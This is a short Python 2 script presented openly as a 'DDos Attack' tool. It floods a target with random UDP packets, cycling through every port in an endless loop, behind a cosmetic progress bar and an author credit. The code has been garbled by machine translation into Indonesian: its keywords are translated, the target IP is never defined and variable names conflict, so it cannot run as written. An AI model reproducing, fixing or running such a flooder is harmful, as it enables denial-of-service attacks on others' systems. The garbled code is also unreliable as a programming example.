# attacking.sz
Attacking target
impor sys
impor os
waktu impor
soket impor
impor acak
# Kode Waktu
dari datetime impor datetime
sekarang = datetime.now ()
jam = sekarang
menit = now.minute
hari = now.day
bulan = now.month
tahun = sekarang. tahun

# ##############
sock = socket.socket (socket. AF_INET , socket. SOCK_DGRAM )
bytes  = random._urandom ( 1490 )
# #############

os.system ( " hapus " )
os.system ( " figlet DDos Attack " )
mencetak
cetak  " Penulis: MrSz "
cetak  " github: https://github.com/MrSz84799 "
port =  input ( " Port: " )

os.system ( " hapus " )
os.system ( " Mulai Serangan figlet " )
cetak  " [] 0% "
time.sleep ( 5 )
cetak  " [=====] 25% "
time.sleep ( 5 )
cetak  " [==========] 50% "
time.sleep ( 5 )
cetak  " [===============] 75% "
time.sleep ( 5 )
cetak  " [====================]] 100% "
time.sleep ( 3 )
terkirim =  0
sementara  Benar :
     sock.sendto ( bytes , (ip, port))
     pengirimannya = dikirim +  1
     Port = pelabuhan +  1
     print  "Paket % s terkirim ke port % s throught: % s " % (terkirim, ip, port)
     jika port ==  65534 :
       port =  1
